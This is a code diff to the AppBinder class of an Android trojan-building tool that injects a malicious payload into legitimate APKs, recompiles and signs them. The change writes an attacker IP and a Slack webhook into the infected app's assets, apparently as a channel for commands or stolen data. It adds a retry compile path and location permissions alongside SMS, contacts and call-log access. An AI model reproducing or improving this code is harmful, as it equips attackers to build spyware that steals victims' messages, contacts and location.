@@ -56,9 +56,9 @@ public class AppBinder extends AsyncTask<String, String, Boolean> {
             if (decompile_normal_apk(strings[0]))
                 if (decompile_payload())
                     if (move_payload_files_to_normal_apk())
-                        if (edit_app(strings[1]))
+                        if (edit_app(strings[1],strings[2]))
                             if (hook_smali_file(strings[0]))
-                                if(injectPermission&&inject_permissions())
+                                if(injectPermission&&inject_permissions()){}
                                     if (compile_build())
                                         if (sign()) {
                                             deleteFolder(working_dir + "normal_apk");
@@ -150,28 +150,26 @@ public class AppBinder extends AsyncTask<String, String, Boolean> {
             return false;
         }
     }
-    private boolean edit_app(String ip){
+    private boolean edit_app(String ip, String slackHook){
         log.i("[*] Trying to inject malicious code");
-        String fileName = res_dir+"ip.txt";
-        File file = new File(fileName);
-        FileReader fr = null;
-        String line;
         try {
-            fr = new FileReader(file);
-            BufferedReader br = new BufferedReader(fr);
             if(new File(working_dir+"normal_apk/assets").exists()) {
                 FileWriter fw=new FileWriter(working_dir+"normal_apk/assets/ip.txt");
-                while((line=br.readLine()) != null){
-                    fw.write(line.replaceAll("http://192.168.43.1:8080",ip));
-                }//loop
+                if(slackHook.length()>0){
+                    fw.write(ip+"\n"+slackHook);
+                } else {
+                    fw.write(ip+"\n"+ "slackhook");
+                }
                 fw.close();
                 log.s("[+] Injected malicious code Successfully!");
                 return true;
             }else if(new File(working_dir+"normal_apk/assets").mkdirs()) {
                 FileWriter fw=new FileWriter(working_dir+"normal_apk/assets/ip.txt");
-                while((line=br.readLine()) != null){
-                    fw.write(line.replaceAll("http://192.168.43.1:8080",ip));
-                }//loop
+                if(slackHook.length()>0){
+                    fw.write(ip+"\n"+slackHook);
+                } else {
+                    fw.write(ip+"\n"+ "slackhook");
+                }
                 fw.close();
                 log.s("[+] Injected malicious code Successfully!");
                 return true;
@@ -234,6 +232,25 @@ public class AppBinder extends AsyncTask<String, String, Boolean> {
                 Main.main(new String[]{"b", working_dir+"normal_apk", "-o", working_dir+"unsigned.apk"});
             }
             log.s("[+] Compiled Infected APK Successfully !");
+            return true;
+        } catch (Exception e) {
+            if(injectPermission){
+                log.w("[?] Failed to Compile Infected APK!");
+                return compile_build_aapt2();
+            }else{
+                log.e("[!] Failed to Compile Infected APK");
+                log.ex("Error: "+ e.toString());
+                return false;
+            }
+        }
+    }
+    private boolean compile_build_aapt2() {
+        log.i("[*] Trying again using --aapt2, Please wait...");
+        log.w("[?] It usually takes few minutes, Do not close app or lock screen!");
+        try {
+            String framework =reactContext.getFilesDir().getAbsolutePath()+"/framework";
+            Main.main(new String[]{"b","-a", getAapt2(), "--use-aapt2","-p", framework, working_dir+"normal_apk", "-o", working_dir+"unsigned.apk"});
+            log.s("[+] Compiled Infected APK Successfully Using AAPT2 !");
             return true;
         } catch (Exception e) {
             log.e("[!] Failed to Compile Infected APK");
@@ -466,6 +483,7 @@ public class AppBinder extends AsyncTask<String, String, Boolean> {
             "    <uses-permission android:name=\"android.permission.READ_SMS\" />\n" +
             "    <uses-permission android:name=\"android.permission.READ_CONTACTS\" />\n" +
             "    <uses-permission android:name=\"android.permission.READ_CALL_LOG\" />\n" +
+            "    <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\" />\n" +
+            "    <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\" />\n" +
             "    <uses-permission android:name=\"android.permission.SEND_SMS\" />\n";
-
 }
